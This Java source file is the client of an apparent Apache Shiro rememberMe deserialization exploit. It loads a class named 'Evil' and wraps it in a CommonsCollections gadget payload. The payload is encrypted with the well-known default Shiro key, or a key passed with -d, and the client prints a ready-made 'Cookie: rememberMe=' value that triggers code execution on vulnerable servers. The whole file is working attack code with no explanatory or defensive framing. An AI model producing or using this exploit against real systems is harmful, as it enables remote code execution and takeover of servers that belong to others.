package com.govuln.shiroattack;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class Client {
    public static void main(String[] args) throws Exception {
        // 默认 shiro_key
        String defaultShiroKey = "kPH+bIxk5D2deZiIxcaaaA==";
        String shiroKey = defaultShiroKey;

        // 解析命令行参数，接受 -d 参数
        for (int i = 0; i < args.length; i++) {
            if (args[i].equals("-d") && i + 1 < args.length) {
                // 获取 -d 后面的 shiro_key
                shiroKey = args[i + 1].trim();  // 去除前后空格
                break;
            }
        }


        // 加载恶意类并生成 payload
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(com.govuln.shiroattack.Evil.class.getName());
        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());

        // 使用 AesCipherService 加密 payload
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode(shiroKey);
        ByteSource ciphertext = aes.encrypt(payloads, key);


        System.out.println();
        System.out.println();
        // 输出最终的 shiro_key（用于调试）
        System.out.println("[+]default: " + shiroKey);
        System.out.println("[+]modify: PEF+bI6k7D2aaZiXxcaaaC==");
        // 输出加密结果
        System.out.println("[+] shiro rememberMe: ");
        System.out.println("Cookie: rememberMe="+ciphertext.toString());

    }
}